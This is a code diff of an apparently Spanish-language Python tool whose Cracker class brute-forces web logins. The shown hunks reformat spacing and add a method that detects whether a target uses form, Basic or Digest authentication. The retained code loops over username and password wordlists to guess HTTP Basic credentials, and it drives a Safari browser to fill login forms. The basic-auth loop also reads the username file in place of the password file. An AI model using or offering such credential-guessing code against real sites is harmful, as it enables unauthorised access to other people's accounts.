@@ -6,31 +6,44 @@ from selenium import webdriver
 
 
 class Cracker(HTTPrequest):
-    def __init__(self, url,dictionary_user, dictionary_pass):
+    def __init__(self, url, dictionary_user, dictionary_pass):
         super().__init__()
         self.numrequests = 0
         self.urlattack = url
-        self.dictusername=dictionary_user
-        self.dictpassword=dictionary_pass
+        self.authentication=""
+        self.dictusername = dictionary_user
+        self.dictpassword = dictionary_pass
+
+    def detect_auth(self):
+        request = {'method': 'get', 'url': self.urlattack}
+        response, result = self.request(request)
+        if response.status_code == 200:
+            self.authentication = 'form'
+        if response.status_code == 401:
+            if response.headers['WWW-Authenticate'].find('Basic')!=-1:
+                self.authentication = 'basic'
+            elif response.headers['WWW-Authenticate'].find('Digest')!=-1:
+                self.authentication='digest'
+
 
     def basicauthcrack(self):
-        dictus=open(self.dictusername)
-        dictpass=open(self.dictusername)
-        exit=False
+        dictus = open(self.dictusername)
+        dictpass = open(self.dictusername)
+        exit = False
         for lineaus in dictus:
             if exit:
                 break
-            username=lineaus
+            username = lineaus
             for lineapass in dictpass:
-                password=lineapass
-                request={'method':'get', 'url':self.urlattack,'auth':HTTPBasicAuth(username, password)}
-                response,result = self.request(request)
-                if result['status']<0:
+                password = lineapass
+                request = {'method': 'get', 'url': self.urlattack, 'auth': HTTPBasicAuth(username, password)}
+                response, result = self.request(request)
+                if result['status'] < 0:
                     print('Error en la conexión')
                     break
                 if response.status_code == 200:
-                    exit=True
-                    print('Usuario '+username+' y contraseña '+password+' válidos')
+                    exit = True
+                    print('Usuario ' + username + ' y contraseña ' + password + ' válidos')
                     break
         if not exit:
             print('Ningún usuario y contraseña válidos')
@@ -98,12 +111,12 @@ class Cracker(HTTPrequest):
             print('Usuario y contraseña incorrectos')
 
     def seleniumformcrack(self, username, password):
-        driver=webdriver.Safari()
+        driver = webdriver.Safari()
         driver.get(self.urlattack)
 
         user_box = driver.find_element("id", "username")
-        pass_box=driver.find_element("id", "password")
-        login=driver.find_element("class_name", "ui-button fn-width80")
+        pass_box = driver.find_element("id", "password")
+        login = driver.find_element("class_name", "ui-button fn-width80")
         user_box.send_keys(username)
         pass_box.send_keys(password)
         login.click()
